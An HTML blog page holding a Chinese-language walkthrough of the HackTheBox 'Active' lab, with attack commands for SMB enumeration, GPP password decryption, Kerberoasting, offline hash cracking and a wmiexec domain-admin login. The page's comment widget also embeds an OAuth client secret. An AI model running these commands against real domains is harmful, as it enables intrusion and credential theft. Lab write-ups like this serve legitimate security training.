@@ -1,0 +1,319 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Active Directory 101-Active | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Active Directory 101-Active | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Active
+前言
+AD域的第三台靶机 用到了一些前面没有用到的技术。
+信息收集
+Nmap scan report for 10.10.10.100
+Host is up (0.41s latency).
+Not shown: 65512 ..." />
+    <meta name="keywords" content="SMB枚举,Kerberoasting,GPP加密,AD域,HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Active Directory 101-Active
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-05
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/FBoKsQTVc/" class="post-tag">
+                  # SMB枚举
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/K4tNXdfhF9/" class="post-tag">
+                  # Kerberoasting
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/qkxekTd3lx/" class="post-tag">
+                  # GPP加密
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="active">Active</h1>
+<h2 id="前言">前言</h2>
+<p>AD域的第三台靶机 用到了一些前面没有用到的技术。</p>
+<h2 id="信息收集">信息收集</h2>
+<pre><code>Nmap scan report for 10.10.10.100
+Host is up (0.41s latency).
+Not shown: 65512 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-10 14:36:34Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+49171/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</code></pre>
+<p>得到一堆信息 开放了端口 尝试进行SMB枚举。</p>
+<h3 id="smb枚举">SMB枚举</h3>
+<pre><code>smbmap -H 10.10.10.100
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142255617.png" alt="image-20231205142255617" loading="lazy"></figure>
+<p>得到目标一共有7个SMB共享服务 其中可以匿名访问的为<strong>Replication</strong></p>
+<p>访问该目录</p>
+<pre><code> smbclient //10.10.10.100/Replication -U &quot;&quot;%&quot;&quot;
+</code></pre>
+<p>最后发现 SVC_TGS用户的账号和密码</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142522259.png" alt="image-20231205142522259" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142552158.png" alt="image-20231205142552158" loading="lazy"></figure>
+<h2 id="gpp密码解密">GPP密码解密</h2>
+<p>每当创建新的组策略首选项 (GPP) 时，都会在 SYSVOL 共享中创建一个带有该配置数据的 xml 文件，包括与 GPP 关联的任何密码。为安全起见，Microsoft将密码存储为<code>cpassword</code>. 但随后微软在 MSDN 上<a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">公布了密钥！</a>，微软在 2014 年发布了一个补丁，阻止管理员将密码输入 GPP。但是该补丁对已经存在的这些易破解密码没有任何作用。</p>
+<p>由于密钥已经知道了 所以可以直接解密。</p>
+<pre><code>gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142901856.png" alt="image-20231205142901856" loading="lazy"></figure>
+<p>得到了SVC_TGS的密码  GPPstillStandingStrong2k18 。</p>
+<p>可以通过smb协议登录机器了。</p>
+<p>将桌面上的user.txt下载下来就可以了。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205143333781.png" alt="image-20231205143333781" loading="lazy"></figure>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<p>其实我一开始还不太熟悉 不知道用这个攻击 但是看提示问我 哪个账户容易受到Kerberoasting攻击，那么这里应该就是用这种方法了。这种攻击发生在TGS_REQ的阶段，KDC的TGS服务返回一个由服务Hash加密的STG给客户端。由于该ST是用服务Hash进行加密的，所以客户端拿到hash后可以进行离线暴破。有可能可以暴破出字典。</p>
+<h3 id="请求服务票据">请求服务票据</h3>
+<p>这里用的是impacket请求 使用Rubeus或者mimikat应该都是可以的。</p>
+<pre><code>GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205144752165.png" alt="image-20231205144752165" loading="lazy"></figure>
+<h3 id="离线破解">离线破解</h3>
+<p>将票据内容保存下来使用工具破解。</p>
+<p>我是直接复制下来创建一个文件 如果是mimikatz我记得是没法直接复制的。然后使用john破解 我感觉这个比hashcat快一些。</p>
+<p>字典才用的是流传的rockyou字典。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205145054909.png" alt="image-20231205145054909" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205145103531.png" alt="image-20231205145103531" loading="lazy"></figure>
+<p>成功破解出密码为   <strong>Ticketmaster1968</strong></p>
+<pre><code>wmiexec.py administrator:Ticketmaster1968@10.10.10.100   
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205145513572.png" alt="image-20231205145513572" loading="lazy"></figure>
+<p>成功拿到域管权限。</p>
+<h2 id="总结">总结</h2>
+<p>这台靶机的还是比较轻松的，思路大概就是通过前期一个SMB服务可以实现匿名访问 然后发现了带有域内账号密码的的文件，通过公开的密钥将其密码破解了出来。这一步得到了域内普通用户的权限，后面通过Kerberoasting攻击得到域管的hash通过离线破解的方式可以得到密码得到域管权限。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#active">Active</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#smb%E6%9E%9A%E4%B8%BE">SMB枚举</a></li>
+</ul>
+</li>
+<li><a href="#gpp%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86">GPP密码解密</a></li>
+<li><a href="#kerberoasting">Kerberoasting</a>
+<ul>
+<li><a href="#%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE">请求服务票据</a></li>
+<li><a href="#%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3">离线破解</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/sauna/">
+              <h3 class="post-title">
+                Active Directory 101-Sauna
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
